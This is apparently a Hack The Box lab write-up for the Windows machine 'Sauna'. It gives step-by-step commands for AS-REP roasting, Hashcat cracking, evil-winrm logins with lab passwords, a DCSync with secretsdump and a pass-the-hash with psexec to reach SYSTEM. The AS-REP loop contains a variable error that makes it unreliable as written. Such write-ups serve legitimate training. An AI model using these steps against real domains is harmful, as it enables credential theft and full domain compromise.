# HTB - Sauna

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Windows-0078D6)
![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Category](https://img.shields.io/badge/Category-Active%20Directory-red)

## Overview

**Sauna** is an Easy Windows machine focused on Active Directory enumeration and exploitation.

The attack path involves identifying domain users from information exposed on the target's website, performing an **AS-REP Roasting** attack against an account without Kerberos pre-authentication, and using the recovered credentials to gain an initial foothold through **WinRM**.

After obtaining access, **WinPEAS** reveals credentials associated with another domain account. BloodHound is then used to identify that this account has **DCSync privileges**, allowing the extraction of the domain administrator's NTLM hash. Finally, a **Pass-the-Hash** attack provides SYSTEM-level access.

## Attack Chain

```text
Website Employee Names
        │
        ▼
Username Enumeration
        │
        ▼
AS-REP Roasting
        │
        ▼
Password Cracking
        │
        ▼
WinRM Access as fsmith
        │
        ▼
WinPEAS Enumeration
        │
        ▼
Credentials for svc_loanmgr
        │
        ▼
BloodHound Analysis
        │
        ▼
DCSync Privileges
        │
        ▼
Administrator NTLM Hash
        │
        ▼
Pass-the-Hash
        │
        ▼
NT AUTHORITY\SYSTEM
```

---

# 1. Reconnaissance

## 1.1 Port Scan

An initial full TCP scan was performed to identify the exposed services:

```bash
nmap -sS -sV -sC -p- --min-rate 5000 10.129.95.180 -oN nmap
```

<img width="955" height="754" alt="image" src="https://github.com/user-attachments/assets/e8373b26-4a3e-466f-9e14-6a0442a81c56" />



The results revealed several services commonly associated with a Windows Domain Controller, including:

- DNS
- Kerberos
- LDAP
- SMB
- RPC
- WinRM
- HTTP

The domain identified during enumeration was:

```text
EGOTISTICAL-BANK.LOCAL
```

The presence of Kerberos, LDAP and SMB indicated that the target was likely an Active Directory Domain Controller.

---

# 2. Service Enumeration

## 2.1 LDAP Enumeration

Anonymous LDAP enumeration was tested using `windapsearch`:

```bash
windapsearch -d egotistical-bank.local --dc-ip 10.129.95.180 -U
```

Anonymous binding was allowed, but no useful domain objects were returned.

Additional enumeration was attempted using Impacket:

```bash
GetADUsers.py egotistical-bank.local/ -dc-ip 10.129.95.180 -debug
```

This also did not reveal useful domain users.

---

## 2.2 SMB Enumeration

SMB shares were checked using anonymous authentication:

```bash
smbclient -L //10.129.95.180/ -N
```

Although anonymous authentication was accepted, no useful shares were exposed.

<img width="954" height="346" alt="image" src="https://github.com/user-attachments/assets/0ee3fb63-f01a-42b1-a52d-f71e93e9a552" />


---

## 2.3 Web Enumeration

The target hosted a banking website on port 80.

Directory enumeration was performed using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://10.129.95.180/FUZZ
```

The scan revealed several common files and directories. While reviewing the website, the `about.html` page contained the full names of multiple employees.

These names were valuable because they could be used to generate possible Active Directory usernames.

---

# 3. Initial Access

## 3.1 Username Generation

The employee names were saved in a file:

```text
fullnames.txt
```

`Username Anarchy` was used to generate common username formats:

```bash
./username-anarchy \
--input-file fullnames.txt \
--select-format first,flast,first.last,firstl \
> users.txt
```

This generated possible usernames based on formats such as:

```text
first
first.last
firstl
flast
```

---

## 3.2 AS-REP Roasting

The generated usernames were tested to identify accounts with Kerberos pre-authentication disabled:

```bash
while read user; do
    GetNPUsers.py \
    egotistical-bank.local/"$p" \
    -request \
    -no-pass \
    -dc-ip 10.129.95.180
done < users.txt
```

A valid AS-REP hash was obtained for the user:

```text
fsmith
```

<img width="953" height="527" alt="image" src="https://github.com/user-attachments/assets/c50e8fe7-04b8-49b0-9353-84ace810cef5" />


AS-REP Roasting is possible when a domain account has the **Do not require Kerberos preauthentication** setting enabled.

In this situation, an attacker can request authentication data for the account without knowing its password. The returned data can then be cracked offline.

---

## 3.3 Password Cracking

The extracted hash was saved to:

```text
pass.txt
```

The hash was cracked using Hashcat with mode `18200`, corresponding to Kerberos 5 AS-REP etype 23:

```bash
hashcat -m 18200 \
pass.txt \
/usr/share/wordlists/rockyou.txt
```
<img width="957" height="145" alt="image" src="https://github.com/user-attachments/assets/eb9c1b3a-64b4-464f-8325-abde18991e6b" />


The password was successfully recovered.

---

## 3.4 WinRM Access

The recovered credentials were used to authenticate through WinRM:

```bash
evil-winrm \
-i 10.129.95.180 \
-u fsmith \
-p 'Thestrokes23'
```

This provided an initial PowerShell session on the target.

The user flag was located in:

```text
C:\Users\Fsmith\Desktop\
```

---

# 4. Privilege Escalation

## 4.1 WinPEAS Enumeration

WinPEAS was uploaded to the target through the Evil-WinRM session:

```powershell
upload winPEASx64.exe
```

The enumeration output revealed credentials associated with a service account configured for automatic logon.

The identified account was:

```text
svc_loanmgr
```

The account was also found to be a member of the following group:

```text
Remote Management Users
```

This meant that the account could authenticate through WinRM.

---

## 4.2 Access as svc_loanmgr

A new Evil-WinRM session was established using the recovered credentials:

```bash
evil-winrm \
-i 10.129.95.180 \
-u svc_loanmgr \
-p 'Moneymakestheworldgoround!'
```

This provided access as the service account.

---

# 5. Active Directory Enumeration with BloodHound

BloodHound was used to identify possible privilege escalation paths inside the domain.

The BloodHound Python collector was executed with the credentials of `svc_loanmgr`:

```bash
bloodhound-python \
-u svc_loanmgr \
-p 'Moneymakestheworldgoround!' \
-d EGOTISTICAL-BANK.LOCAL \
-ns 10.129.95.180 \
-c All
```

The generated JSON files were compressed:

```bash
zip bloodhound.zip *.json
```

The archive was then imported into BloodHound.

Using the query:

```text
Find Principals with DCSync Rights
```

BloodHound revealed that:

```text
SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
```

had replication privileges over the domain.

The relevant permission was:

```text
DS-Replication-Get-Changes-All
```

This permission allows an account to perform a **DCSync attack** and request password hashes from the Domain Controller.

---

# 6. DCSync Attack

Impacket's `secretsdump.py` was used to perform the DCSync attack and retrieve the domain administrator's NTLM hash:

```bash
secretsdump.py \
egotistical-bank.local/svc_loanmgr@<TARGET_IP> \
-just-dc-user Administrator
```
<img width="953" height="617" alt="image" src="https://github.com/user-attachments/assets/8c283a17-a006-4df6-a6c0-07c6f7f71df1" />


The command successfully returned the NTLM hash associated with the domain administrator.

---

# 7. Pass-the-Hash

The recovered NTLM hash was used to authenticate as the domain administrator without knowing the plaintext password:

```bash
psexec.py \
egotistical-bank.local/Administrator@10.129.95.180 \
-hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
```

The connection provided a shell with:

```text
NT AUTHORITY\SYSTEM
```
<img width="956" height="349" alt="image" src="https://github.com/user-attachments/assets/60765835-f67e-4712-84c3-72d1d0b08a09" />


The root flag was located in:

```text
C:\Users\Administrator\Desktop\
```

---

# Key Takeaways

- Publicly exposed employee information can be used to generate valid Active Directory usernames.
- Accounts without Kerberos pre-authentication are vulnerable to **AS-REP Roasting**.
- AS-REP hashes can be cracked offline using tools such as Hashcat.
- WinPEAS can reveal sensitive credentials and misconfigurations on Windows systems.
- BloodHound is useful for identifying hidden privilege relationships inside Active Directory.
- **DCSync** allows an account with replication privileges to request password hashes from a Domain Controller.
- **Pass-the-Hash** allows authentication using an NTLM hash without requiring the plaintext password.

---

# Tools Used

- Nmap
- FFUF
- SMBClient
- Windapsearch
- Impacket
- Username Anarchy
- Hashcat
- Evil-WinRM
- WinPEAS
- BloodHound
- Neo4j

---

# Techniques Used

- Active Directory Enumeration
- Username Enumeration
- AS-REP Roasting
- Offline Password Cracking
- WinRM Authentication
- Windows Privilege Escalation
- BloodHound Enumeration
- DCSync
- Pass-the-Hash
